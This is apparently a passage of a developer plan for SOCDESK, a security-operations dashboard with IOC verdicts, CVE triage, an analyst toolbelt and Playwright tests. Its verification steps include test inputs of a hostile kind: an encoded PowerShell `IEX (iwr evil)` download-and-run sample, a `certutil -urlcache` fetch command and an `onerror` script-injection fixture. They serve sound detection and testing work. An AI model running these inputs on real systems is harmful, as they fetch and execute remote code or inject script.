  const hit = idx.ioc.get(q.toLowerCase());
  if (hit) return { kind: "ioc", q, type: hit.ioc_type.toUpperCase(),
    score: hit.confidence ?? 80, word: (hit.confidence ?? 80) >= 75 ? "MALICIOUS" : "SUSPECT",
    tone: (hit.confidence ?? 80) >= 75 ? "red" : "orange", row: hit };
  const prof = idx.name.get(q.toLowerCase());
  if (prof) return { kind: "profile", q, row: prof };          // rendered by T9
  return miss(q, (t || "indicator").toUpperCase());
}
const miss = (q, type) => ({ kind: "miss", q, type, score: 0, word: "UNKNOWN", tone: "muted" });
```
Miss copy (port mockup line 614 semantics): "No observations across the collected corpus in the current windows. Absence is not clearance — pivot to external services for live enrichment." **This is today's live path for IOCs (repository currently empty) — it must look intentional, never broken.**

- [ ] **Step 2: Report render** — port mockup `gaugeSVG`/`renderReport` (lines 603–638) with deltas: no inline styles/onclick (tone classes + `setProperty`); evidence rows for ioc hits = source / malware / confidence / `first_seen → last_seen`; for cve hits = KEV chip + due date (`kev_date_added`), CVSS row, EPSS row (`epss` + percentile), vendors/products, `published_at`; pivot chips become real links (esc'd, `rel="noopener" target="_blank"`), **type-aware per BACKLOG.md**: all types → VirusTotal `https://www.virustotal.com/gui/search/<enc>`, urlscan `https://urlscan.io/search/#<enc>`; ipv4 adds Shodan, Censys, AbuseIPDB, GreyNoise, Spamhaus; domain adds Pulsedive, IBM X-Force; hash adds MetaDefender; url adds PhishTank; cve adds NVD + CISA KEV. **Email indicator type (BACKLOG.md):** extend `detectType` with email regex → pivot-only verdict card (no corpus lookup): HIBP `https://haveibeenpwned.com/account/<enc>` + Hudson Rock. Copy-defanged + copy-raw buttons on the indicator (cross-cutting rule).
  **Verdict sequence (charter #9)** as one directed master timeline on render (documented adaptation: assembly is time-based, not scroll-scrubbed — a verdict must complete in <5s regardless of scroll, per spec §9; the rail is already sticky within Operations):
```js
const tl = g?.timeline({ defaults: { ease: EASE } });
tl?.add(decode(vword, r.word, .7))
  .fromTo(arc, { drawSVG: "0%" }, { drawSVG: pct + "%", duration: DUR.draw, ease: EASE_INOUT }, "-=.35")
  .from(railEl.querySelectorAll(".ev-row"), { opacity: 0, y: 10, duration: .35, stagger: .06 }, "-=.5")
  .from(railEl.querySelectorAll(".pivot"), { opacity: 0, y: 8, duration: .3, stagger: .04 }, "-=.2");
```
(gauge arc uses DrawSVG now, not the CSS dashoffset transition — remove the mockup's `.gauge .arc` transition, line 178, and the rAF nudge, lines 633–636). After the label decode completes, `sealStroke(railEl, r.tone === "red" ? "var(--red)" : "var(--line-bright)")` frames the card — charter #5's replacement for the deleted conic sweep; the red stroke appears only while a malicious verdict is displayed (semantic motion preserved).

- [ ] **Step 3: Omnibox behavior (charter #11)** — port mockup wiring (lines 650–665: input detect chip, Enter, `/` hotkey, TRY chips) with deltas: TRY chips generated from real data (`idx.cve` top-EPSS KEV id, first ioc value if any, "Volt Typhoon"); **bulk mode**: if the pasted text contains ≥2 indicators (split on whitespace/commas/newlines, refang first), render a bulk results panel replacing `#feedRows` (restorable) — one compact row per indicator (indicator mono / type / verdict word tone class / top source) with export bar: **CSV** (`indicator,type,verdict,score,source,malware,first_seen,last_seen`, quoted+escaped), **JSON**, **defanged TXT** — the three formats capability §4.4 requires.
- [ ] **Step 4: Verify** — Enter on a real KEV CVE from `cves.json` → report assembles in order (decode → arc → evidence → pivots), red seal-stroke; unknown domain → UNKNOWN muted state, no red seal; bulk paste of 3 indicators → table + 3 working exports; `/` focuses search; defanged input (`evil[.]example`) auto-refangs; an email address → pivot-only card with HIBP link.
- [ ] **Step 5: Commit** — `git commit -am "feat(site): indicator verdict engine with directed report sequence, type-aware pivots and bulk export"`

---

### Task 7: Daily brief — capability §4.2, purple AI treatment + staleness (charter #11-shimmer)

**Files:**
- Create: `site/js/render/brief.js`
- Modify: `site/js/app.js`

- [ ] **Step 1: Write `brief.js`** — three states, all Chart-Room lawful (purple only inside this section, design-system §3):
  1. **Loading** (before `loadAll` resolves): three skeleton `.bitem` rows of bone/purple hairline blocks pulsing opacity .35→.6 (GSAP `repeat:-1 yoyo`, killed on data; ≤1.6s period; **no gradient shimmer** — gradients on components are banned §7.4; this is the ban-compliant "AI-loading" port).
  2. **Rendered**: `data.brief.stories` → `.bitem` grid (port mockup lines 308–331 structure): `B<n>` purple num, escaped `title`/`summary`, "Why it matters" purple label + escaped `why_it_matters`; `#briefGenerated` = `generated_at` + `rel()`; append `.ai-chip` "AI · LOCAL INFERENCE" to the sec-head; render `trending`/`kev_notables` arrays as purple-bordered chips under the list when present (defensive: every field optional).
  3. **Absent/stale**: `brief === null` → a single `.bitem` with muted copy: "No brief published yet. The brief is written on local hardware twice daily and ships independently of raw collection — feed freshness is unaffected." Stale (>26h) → keep content, prepend `.stale-chip` with age (matches topbar chip from T3).
- [ ] **Step 2: Verify** — with no `site/data/brief.json` the absent state renders (this is today's reality); drop a hand-made `brief.json` fixture into `site/data/` → stories render, purple confined to section 01; delete fixture after (`site/data/` is gitignored, nothing to clean in git).
- [ ] **Step 3: Commit** — `git commit -am "feat(site): daily brief with AI treatment, staleness and absent-state fallback"`

---

### Task 8: Vulnerability triage — capability §4.3, sortable + vendor watchlist

**Files:**
- Create: `site/js/render/vulns.js`
- Modify: `site/index.html` (watchlist bar), `site/js/app.js`

- [ ] **Step 1: HTML delta** — above the vulns `.vtable` insert a watchlist bar (`.ops-tools` styling reused): text input `#wlInput` (placeholder "Add vendor or product to watchlist — e.g. fortinet"), chip row `#wlChips`, filter toggle chip `#wlOnly` ("Watchlist only"), and a KEV-only toggle `#kevOnly`.
- [ ] **Step 2: Write `vulns.js`** — table over `data.cves.cves` (4,300+ rows: render top 100 of current sort, `content-visibility` on rows, "Show more" appends 100):
  - **Default ordering surfaces exploited-and-likely first:** sort key `(kev ? 2 : 0) + (epss ?? 0)` desc, then `cvss` desc — KEV rows with high EPSS lead.
  - Sortable headers (CVE / CVSS / EPSS / Published, click toggles asc/desc, `aria-sort`, mono caret indicator).
  - Row port of mockup template (lines 677–682) with deltas: severity class from `cvss_severity` (lowercased → `sev-*`, null → `sev-unknown` muted "—"); EPSS as `Math.round(epss*100) + "%"` + percentile title attr; KEV chip includes `kev_ransomware` variant (chip text `KEV·R`); product/vendor = `products[0] / vendors[0]` escaped, "—" fallback; published = `day(published_at)`; every CVE cell click runs the T6 verdict for that CVE (cross-link), plus copy-raw/copy-defanged on hover actions (cross-cutting rule).
  - **Watchlist:** chips from `state.watchlist` with remove ×; add via input Enter → `setWatchlist`; `#wlOnly` filters rows where any of `vendors[]/products[]` contains a watchlist term (substring, lowercase). Watchlist persists (localStorage).
- [ ] **Step 3: Verify** — default top rows are KEV+high-EPSS (inspect first 5 against `cves.json` sorted manually in console); add "fortinet" to watchlist → filter narrows and survives reload; sort toggles work; 4,300 rows never render at once.
- [ ] **Step 4: Commit** — `git commit -am "feat(site): vulnerability triage with KEV/EPSS default ordering and vendor watchlist"`

---

### Task 9: Actor & malware profiles — capability §4.5

**Files:**
- Create: `site/js/render/profiles.js`
- Modify: `site/js/render/verdict.js` (route `kind:"profile"`), `site/js/render/rail.js` (entity chips route here)

- [ ] **Step 1: Write `profiles.js`** — `renderProfile(p, data)` renders into the rail (design-system §5: reports render in the rail, never a route change): header `PROFILE · <ATTACK_ID>` (tone-accent), name as `.rail-title`, aliases as muted mono line, description escaped and clamped to ~600 chars with "MITRE ↗" link `https://attack.mitre.org/{groups|software}/<attack_id>` (esc'd, noopener), techniques as `.vtag` chips (first 12, each linking `https://attack.mitre.org/techniques/<id, dots→/>`), software list as pivot chips that re-run the omnibox lookup (software name → malware profile). **Cross-links:** related feed items = `feed.items` where `entities.actors`/`entities.malware` contains name or alias (top 5, click selects in feed); related IOCs = ioc entries whose `malware` field matches name/alias (top 5, click runs verdict). `sealStroke(railEl, "var(--line-bright)")` after header decode — the neutral profile framing.
- [ ] **Step 2: Wire** — omnibox `kind:"profile"` verdicts route here; rail entity chips (T5) call the same path.
- [ ] **Step 3: Verify** — search "Volt Typhoon" → profile with techniques/software; a software chip pivots to its malware profile; a ransomware feed item's actor chip (e.g. "akira" → miss is acceptable if not ATT&CK-listed: miss state must render, not error).
- [ ] **Step 4: Commit** — `git commit -am "feat(site): ATT&CK actor and malware profiles with feed/IOC cross-links"`

---

### Task 10: Collection health + source registry — capabilities §4.6–§4.7 (charter #3, #7)

**Files:**
- Create: `site/js/render/health.js`, `site/js/render/registry.js`
- Modify: `site/js/app.js`

- [ ] **Step 1: Write `health.js`** — grid from `data.health.sources` (however many exist; `attack` appears on cache-refresh runs): port cell template (mockup lines 683–686) with deltas: status dot `deg` when `!ok`; failed sources show error first line (escaped, clamped 80 chars) in `.m` in `--gold`; `last_success_at` → `rel()` or "NEVER"; `pipeline_warnings` (present in real payloads when the gate trips) render as a full-width warning strip above the grid. **Wavefront reveal (charter #3):** on section enter, `g.from(cells, { opacity: 0, y: 16, duration: .5, ease: EASE, stagger: { each: .07, grid: [Math.ceil(n/3), 3], from: 0 } })` then `countUp` each `.n`. **Sparkline + rider (charter #7):** under each cell's count, 14-day histogram of that source's `feed.items` per day (d3-array `rollup` on `day(published_at)`, d3-scale linear x/y, d3-shape `line()` over a 120×28 SVG in `--line-bright` 1px); draw with `g.fromTo(path, {drawSVG:"0%"}, {drawSVG:"100%", duration: DUR.draw, ease: EASE_INOUT})` and a 3px bone rider dot following via `motionPath: { path, alignOrigin: [.5,.5] }` ending on the latest datapoint. Sources with zero feed items (IOC-repository sources) render no sparkline — data-honest, not an empty chart.
- [ ] **Step 2: Write `registry.js`** — table from `data.sources.sources` (24 rows): port template (lines 687–690) with deltas: kind chip `tone-accent` for `collector` / `tone-muted` for `reference`; collector rows show enabled state (`enabled:false` → "DISABLED" muted); OPEN ↗ becomes a real `safeUrl(s.url)` link, noopener; sec-kicker counts (`#regCollectors`/`#regReference`) computed. Collector rows cross-link to their health cell (click scrolls + flashes the cell border 150ms).
- [ ] **Step 3: Verify** — degraded sources (currently the abuse.ch trio at 401) render gold dots + error text — the real data exercises this today; wavefront runs once from the top-left cell; sparklines draw with rider settling on the last day; registry rows link out correctly.
- [ ] **Step 4: Commit** — `git commit -am "feat(site): collection health with sparklines and source registry"`

---

### Task 11: Analyst toolbelt — capability §4.8 (CARL public-data snapshot port)

**Files:**
- Create: `site/js/toolbelt/tools.js`, `site/js/toolbelt/belt.js`

- [ ] **Step 1: Write `tools.js`** as a CARL snapshot port. Source: `C:\Users\Carl\Desktop\Projects\CARL\src\carl-tools.js` (public-data utilities only — spec §8 CARL boundary; snapshot, not shared module). Port these exact regions, converting each `CARL.register` member to a plain `export`, dropping all `CARL.*` references (line refs verified 2026-08-02):
  - `_patterns` + `extractIOCs` (lines 23–120) → `export const patterns`, `export function extractIOCs` (delta: `this._patterns` → `patterns`).
  - `defang` (150–183) and `refang` (191–211) → exported functions, verbatim bodies.
  - `PS_FLAG_MAP` (310–321), `PS_RISK_FLAGS` (327–337), `LOLBIN_DB` (345–379, the full 33-binary table — port every entry byte-for-byte) → exported consts.
  - `psDecodeBase64` (386–398) → exported verbatim — this is the UTF-16LE-aware Base64 decode.
  - `psParseCommandLine` (407–484) → exported (deltas: `this.PS_FLAG_MAP`→`PS_FLAG_MAP`, `this.PS_RISK_FLAGS`→`PS_RISK_FLAGS`, `this.psDecodeBase64`→`psDecodeBase64`).
  - `lolbinAnalyze` (577–595) → exported (delta: drop the `CARL.knowledge` preference — `var db = LOLBIN_DB;`).
  Not ported (client-aware or out of scope): email templates, KQL formatter, redirect unwrapper, greeting.
  Plus one new function (complete):
```js
export function smartDecodeBase64(s) {   // toolbelt card: try UTF-16LE first, fall back to UTF-8
  const clean = s.trim().replace(/\s+/g, "");
  const utf16 = psDecodeBase64(clean);
  if (utf16 && /^[\x09\x0a\x0d\x20-\x7e]+$/.test(utf16)) return { text: utf16, encoding: "UTF-16LE" };
  try { return { text: new TextDecoder().decode(Uint8Array.from(atob(clean), c => c.charCodeAt(0))), encoding: "UTF-8" }; }
  catch { return null; }
}
```
- [ ] **Step 2: Write `belt.js`** wiring the five cards (all outputs `textContent`, never innerHTML — toolbelt output needs no markup, strongest escaping): **Defang/refang** — button toggles mode label, runs `defang`/`refang`. **IOC extract** — `extractIOCs`, output grouped by type with counts, plus two actions: "Copy defanged" and **"Lookup all ↗"** which feeds every extracted indicator into the T6 bulk verdict (capability §4.8's pivot into §4.4). **Base64 decode** — `smartDecodeBase64`, shows detected encoding chip; null → "Not valid Base64." **PowerShell parser** — `psParseCommandLine`: binary, resolved flags with risk descriptions, decoded `-EncodedCommand` payload when present, overall risk word in `tone-red/orange/green`, MITRE ids as chips. **LOLBin lookup** — `lolbinAnalyze`: risk, MITRE technique chip, description, matched suspicious flags; unknown binary → "Not in the 33-entry LOLBin DB." All textareas never leave the page (no network calls in this module — asserted in T15 via network log).
- [ ] **Step 3: Verify** — a real UTF-16LE `-enc` sample (build in console: `btoa(String.fromCharCode(...[..."IEX (iwr evil)"].flatMap(c=>[c.charCodeAt(0),0])))`) parses with HIGH risk + decoded payload; `certutil -urlcache -split -f http://x` hits the LOLBin DB with both flags; extract → Lookup-all lands in the bulk verdict table.
- [ ] **Step 4: Commit** — `git commit -am "feat(site): analyst toolbelt — CARL public-data snapshot port with verdict pivot"`

---

### Task 12: Shift handoff digest — capability §4.9

**Files:**
- Modify: `site/js/toolbelt/belt.js`, `site/js/app.js`

- [ ] **Step 1: Digest builder** (complete, in `belt.js`):
```js
export function handoffDigest(notable) {
  const items = Object.entries(notable).map(([id, n]) => n)
    .sort((a, b) => a.ts.localeCompare(b.ts));
  const head = `# SOCDESK shift handoff — ${new Date().toISOString().slice(0, 16)}Z`;
  if (!items.length) return `${head}\n\n_No items flagged notable this shift._`;
  return [head, "", ...items.map(n =>
    `- **${n.title}** _(${n.source})_\n  ${n.url}\n  flagged ${n.ts.slice(0, 16)}Z`),
    "", `${items.length} item(s) flagged in SOCDESK. Marks clear when unflagged.`].join("\n");
}
```
(markdown is for a paste target, not our DOM — clipboard text is inert.)
- [ ] **Step 2: Wire `#handoffBtn`** — click → `navigator.clipboard.writeText(handoffDigest(state.notable))`, label flips to `COPIED ✓` 1.2s, count badge stays; a small `.act` "Clear" button appears next to it only when count > 0, confirming via double-click.
- [ ] **Step 3: Verify** — flag two feed items notable → Handoff (2) ↗ → clipboard holds valid markdown with both items chronological; clear resets.
- [ ] **Step 4: Commit** — `git commit -am "feat(site): one-click shift handoff digest from notable flags"`

---

### Task 13: Scroll choreography pass — sectional timelines, ink draws, decode cascade, spotlight (charter #1, #2, #6, #11; craft disciplines 1–4)

**Files:**
- Modify: `site/js/app.js`, `site/js/motion.js`, `site/css/chrome.css`, `site/css/ops.css`

Storyboard first (craft discipline 1), then implement — the storyboard IS this step list:
- [ ] **Step 1: Sectional master timelines (charter #6)** — replace the temporary IntersectionObserver `.reveal` system from T3 for section heads with one function in `motion.js`:
```js
export function sectionTimeline(sec) {
  const head = sec.querySelector(".sec-head");
  if (!g) { head?.classList.add("in"); return; }
  const kicker = head.querySelector(".sec-kicker"), rule = head.querySelector(".rule");
  const tl = g.timeline({ defaults: { ease: EASE },
    scrollTrigger: { trigger: sec, start: "top 78%", once: true } });
  tl.add(decode(kicker, kicker.textContent, .6))                       // charter #1 cascade
    .from(head.querySelector("h2"), { yPercent: 24, opacity: 0, duration: .55 }, "-=.35")
    .from(head.querySelector(".sec-desc"), { opacity: 0, y: 12, duration: .4 }, "-=.3");
  if (rule) tl.fromTo(rule, { scaleX: 0 }, { scaleX: 1, duration: .7, ease: EASE_INOUT }, "<");
  return tl;
}
```
Body content of each section joins its section's timeline with deliberate overlap (`"-=.2"` positions), not independent pops: feed/table/grid/tool containers `opacity 0→1, y 16→0, stagger .07` appended by each render module registering a `sectionContent(sec, targets)` hook. Keep the CSS `.reveal` classes only as the no-GSAP fallback (they still work via the T3 IO when `g === null`).
- [ ] **Step 2: Scroll-scrubbed ink draws (charter #2)** — apply scrub to the health sparkline **axes**: axis paths (baseline + left tick) drawn `drawSVG 0→100%` with `scrollTrigger:{trigger: cell, start:"top 90%", end:"top 55%", scrub:true}` — reverses on scroll-up, honest ink. Gauge arcs remain verdict-render-driven (semantic motion, design-system §6) — documented deviation, arcs are not scroll-bound.
- [ ] **Step 3: Boot decode cascade completion (charter #1)** — masthead boot timeline (T3) plus per-section kicker decodes give the full document-order cascade; add ~40ms per-char stagger on the `.logo` text only via SplitText (nav links stay static for immediate usability; a11y: SplitText `aria: true` default keeps the accessible name).
- [ ] **Step 4: Spotlight-card hover (charter #11)** — extend the feed-row pointer wash to `.tool` and `.hcell`: shared delegated handler + CSS `::after` radial bone wash at 5% alpha (copy of mockup lines 151–154 pattern; flat, subtle, no glow — 8%-alpha ceiling respected).
- [ ] **Step 5: View Transitions + reduced-motion audit** — rail content swaps (item ↔ verdict ↔ profile) wrap in `document.startViewTransition` when available and `g === null`; add `@media (prefers-reduced-motion: reduce){ ::view-transition-group(*){animation:none} }`. Full-page audit with DevTools reduced-motion: every value/verdict/table correct and instant; nothing loops except ticker + status pings; nothing exceeds 1.6s.
- [ ] **Step 6: Verify** — scroll the full page top→bottom: each section enters as one composed unit (kicker decode → slab → rule wipe → body), sparkline axes scrub and reverse, no stacked fade-in soup; `g=null` simulation (block CDN in DevTools) still shows everything via CSS fallback.
- [ ] **Step 7: Commit** — `git commit -am "feat(site): sectional master timelines, scrubbed ink draws, spotlight hover"`

---

### Task 14: `_headers` — CSP without unsafe-inline + security headers

**Files:**
- Create: `site/_headers`

- [ ] **Step 1: Write `site/_headers`** (complete; Cloudflare Pages picks it up from the deploy dir — the existing `wrangler pages deploy site` needs no change):
```
/*
  Content-Security-Policy: default-src 'none'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; upgrade-insecure-requests
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Cross-Origin-Opener-Policy: same-origin

/data/*
  Cache-Control: no-cache
```
Why this is achievable with zero `unsafe-inline`: (a) GSAP loads from `cdn.jsdelivr.net` with SRI — `script-src` allows the origin, `integrity` pins content; (b) there are no inline scripts or `on*` handlers anywhere (T1 no-inline law); (c) there are no `style=""` attributes — dynamic styling is classes + CSSOM `el.style.setProperty`, and CSP does **not** block CSSOM writes (only style *attribute parsing*), which is also exactly how GSAP animates; (d) Google Fonts is an external stylesheet (`style-src https://fonts.googleapis.com`) + `font-src fonts.gstatic.com`; (e) the feTurbulence grain is a `data:` SVG **background-image in CSS**, covered by `img-src data:`.
- [ ] **Step 2: Verify locally** — `_headers` is Pages-only, so simulate: temporarily add the same policy as a `<meta http-equiv="Content-Security-Policy">` tag in `index.html`, reload, exercise every view (feed filter, verdict, toolbelt, brief) and confirm **zero** CSP violations in console, then remove the meta tag (the header version is canonical; the meta version can't express frame-ancestors).
- [ ] **Step 3: Commit** — `git add site/_headers && git commit -m "feat(site): strict CSP without unsafe-inline and security headers"`

---

### Task 15: Playwright QA gate — per-view verification

**Files:**
- Create: `site-tests/package.json`, `site-tests/playwright.config.js`, `site-tests/specs/*.spec.js` (9 files per File structure)

- [ ] **Step 1: Scaffold** — `site-tests/package.json`: `{ "private": true, "devDependencies": { "@playwright/test": "1.54.*" } }`; config:
```js
// site-tests/playwright.config.js
module.exports = {
  testDir: "./specs", retries: 0, reporter: "line",
  use: { baseURL: "http://localhost:8123" },
  webServer: { command: "python -m http.server 8123 --directory ../site",
               url: "http://localhost:8123", reuseExistingServer: true },
};
```
Run: `cd site-tests && npm install && npx playwright install chromium`. Add `site-tests/node_modules/` and `site-tests/test-results/` to `.gitignore` first.
- [ ] **Step 2: Write the specs** (each asserts against the REAL data in `site/data/` — the suite is the QA gate from spec §7). Required assertions per file:
  - `chrome.spec.js`: masthead count > 0 and equals computed total; ticker has ≥6 items and duplicates once; staleness chip present iff `feed.generated_at` older than 90min (compute in test); live count matches `health.json` ok-count.
  - `feed.spec.js`: row count == `feed.items.length` (within render cap); each category chip filters to exact count; search narrows; reviewed toggle persists across `page.reload()`; boundary renders when `socdesk:v1:sessionStart` is seeded old; export JSON downloads parseable content.
  - `verdict.spec.js`: real KEV CVE → word `ACTIVELY EXPLOITED`|`CRITICAL`, gauge arc present, ≥2 evidence rows, pivot hrefs all `https:` + `rel=noopener`, ipv4 query shows AbuseIPDB/GreyNoise pivots; garbage domain → `UNKNOWN` muted, no red seal; email → pivot-only card with HIBP; bulk paste of 3 → 3 rows + CSV export has header + 3 lines; **injection fixture**: intercept `data/feed.json` route, inject item with `title: "<img src=x onerror=window.__pwned=1>"` → `page.evaluate(() => window.__pwned) === undefined` and title visible as literal text.
  - `brief.spec.js`: absent state by default (no brief.json); route-mock a brief → 3 stories render, purple class present, generated timestamp shown; stale mock → stale chip.
  - `vulns.spec.js`: first row is KEV with EPSS ≥ table median (compute from fetched json); sort by CVSS desc/asc flips; watchlist "fortinet" filters and persists.
  - `health-registry.spec.js`: cell count == `health.sources.length`; degraded sources (ok:false) show `.deg` + error text; registry row count == 24; every OPEN link is https.
  - `toolbelt.spec.js`: defang round-trips via refang; UTF-16LE `-enc` sample decodes; `certutil -urlcache` → HIGH + T1140; extract→Lookup-all lands in bulk table; **no network requests** fired by any toolbelt action (`page.on("request")` recorder scoped to the interaction).
  - `state.spec.js`: notable flags → handoff clipboard markdown contains both titles (grant `clipboard-read`); clear works; localStorage keys all `socdesk:v1:*`.
  - `csp.spec.js`: inject the T14 policy as meta via route rewrite of index.html, drive one pass through all views, assert zero console messages containing "Content Security Policy"; also assert with GSAP routes aborted the page still renders all data (CDN-failure fallback).
- [ ] **Step 3: Run the gate** — Run: `cd site-tests && npx playwright test`  Expected: all specs pass.
- [ ] **Step 4: Commit** — `git add site-tests .gitignore && git commit -m "test(site): Playwright QA gate across all views, state, escaping and CSP"`

---

### Task 16: Live-data dogfood, design-system v4.1, README

**Files:**
- Modify: `design-system.md`, `README.md`

- [ ] **Step 1: Fresh-data dogfood** — `.venv\Scripts\python run_pipeline.py` (refreshes `site/data/` with this hour's real data), then serve and run the full spec-§9 drill by hand: 24h triage scan under 10 min; paste an indicator → verdict < 5s; every capability reachable with zero explanation. Screenshot masthead/verdict/brief and compare against `design/mockups/g-chartroom.html` side-by-side — the mockup is the visual acceptance test; divergences are bugs unless this plan specified the delta.
- [ ] **Step 2: Placeholder sweep** — Run: `grep -rniE "lorem|placeholder|TODO|FIXME|sample data|mock" site/ --include="*.html" --include="*.js" --include="*.css"`  Expected: no matches. Also: `grep -rn "32783\|30168\|evil-updates" site/` → no matches (no mockup fantasy values survive).
- [ ] **Step 3: Encode charter craft into design-system v4.1** — append `## 9. v4.1 Motion system (Phase B, from the elevation charter)`: the motion tokens (names + values from `tokens.css`), the four craft disciplines, the charter→implementation map, and the two documented adaptations (verdict assembly time-based not scroll-scrubbed; conic sweep replaced by seal-stroke). Bump the header to `v4.1 "Chart Room"`.
- [ ] **Step 4: README** — replace the Phase A placeholder note with a short Phase B section: stack summary, `python -m http.server 8123 --directory site` dev loop, `site-tests` gate command, CDN pin/SRI update procedure.
- [ ] **Step 5: Final commit** — `git add -A && git commit -m "docs: design-system v4.1 motion law and Phase B README"`

---

## Self-review (complete before calling Phase B done)

- [ ] **Spec §4 coverage:** 1 feed (T4) · 2 brief (T7) · 3 triage+watchlist (T8) · 4 IOC lookup+bulk+3 exports (T6) · 5 profiles+cross-links (T9) · 6 health (T10) · 7 registry, 24 sources, collector/reference marked (T10) · 8 toolbelt: defang/refang, UTF-16LE Base64, PS parser, IOC extract→lookup pivot, LOLBin DB (T11) · 9 shift handoff (T12) · cross-cutting copy-defanged/copy-raw on every IOC and CVE (T5, T6, T8) · copy-blurb on every feed item (T5).
- [ ] **Charter coverage:** items #1–#11 per the map in Shared conventions; craft disciplines 1–4 (T13 storyboard, timelines with overlap, FLIP/VT, motion tokens + reduced-motion variants); stack = GSAP+native+D3, no framework, no vendored GSAP source (CDN only); skipped-list respected (no Lenis, no smoothing beyond CSS `scroll-behavior`).
- [ ] **Design-system law:** zero `--amber` refs; purple only in section 01; vermilion at stamp scale; no radius/box-shadow/gradient-on-component/zebra/centered-numerics; unknown = muted never green; hard-ban grep: `grep -rniE "box-shadow|border-radius:[^0]" site/css` → only the sanctioned dot radii.
- [ ] **BACKLOG.md Phase B items landed:** type-aware pivots (T6), email indicator type (T6), registry reference additions deferred to a data change (sources.json edit, not site code).
- [ ] **Degradation:** CDN blocked → full content, CSS-only reveals; `iocs.json` empty (today's reality) → intentional miss verdicts; `brief.json` absent → fallback panel; degraded collectors → gold dots, page whole.
- [ ] **Gate:** `cd site-tests && npx playwright test` green against freshly-pulled real data.
